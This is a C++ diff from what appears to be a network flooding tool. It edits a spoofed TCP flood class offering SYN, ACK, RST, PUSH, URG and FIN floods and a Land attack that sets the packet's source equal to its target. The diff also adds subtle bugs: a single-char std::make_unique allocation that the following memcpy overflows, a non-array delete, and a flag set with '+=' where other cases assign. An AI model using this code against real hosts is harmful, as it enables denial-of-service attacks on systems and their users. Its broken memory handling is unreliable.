@@ -4,6 +4,7 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netdb.h>
+#include <memory>
 
 #include "../Headers/Randomizer.hpp"
 #include "../Headers/Spoofed_TCP_Flood.hpp"
@@ -57,7 +58,7 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             psh.length = htons(sizeof(struct tcphdr) + strlen(buf));
 
             int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(buf);
-            pseudogram = static_cast<char *>(malloc(static_cast<size_t>(psize)));
+            pseudogram = std::make_unique<char>(psize).release();
 
             memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
             memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));
@@ -75,6 +76,8 @@ void Spoofed_TCP_Flood::attack(const int *id) {
                 message = std::to_string(*id) + ": Voly Sent";
                 logger->Log(&message, Logger::Info);
             }
+
+            delete pseudogram;
         }
         message = std::to_string(*id) + ": Voly Sent";
         logger->Log(&message, Logger::Info);
@@ -82,31 +85,31 @@ void Spoofed_TCP_Flood::attack(const int *id) {
     }
 }
 
-Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+Spoofed_TCP_Flood::Spoofed_TCP_Flood(const Config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
 
 }
 
 void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
     switch (conf->vector){
-        case config::SpoofedSyn:
-            tcp->th_flags = TH_SYN;
+        case Config::SpoofedSyn:
+            tcp->th_flags += TH_SYN;
             break;
-        case config::SpoofedAck:
+        case Config::SpoofedAck:
             tcp->th_flags = TH_ACK;
             break;
-        case config::SpoofedRST:
+        case Config::SpoofedRST:
             tcp->th_flags = TH_RST;
             break;
-        case config::SpoofedPUSH:
+        case Config::SpoofedPUSH:
             tcp->th_flags = TH_PUSH;
             break;
-        case config::SpoofedURG:
+        case Config::SpoofedURG:
             tcp->th_flags = TH_URG;
             break;
-        case config::SpoofedFin:
+        case Config::SpoofedFin:
             tcp->th_flags = TH_FIN;
             break;
-        case config::Land:
+        case Config::Land:
             tcp->th_flags = TH_SYN;
             ip->saddr = ip->daddr;
             tcp->source = tcp->dest;
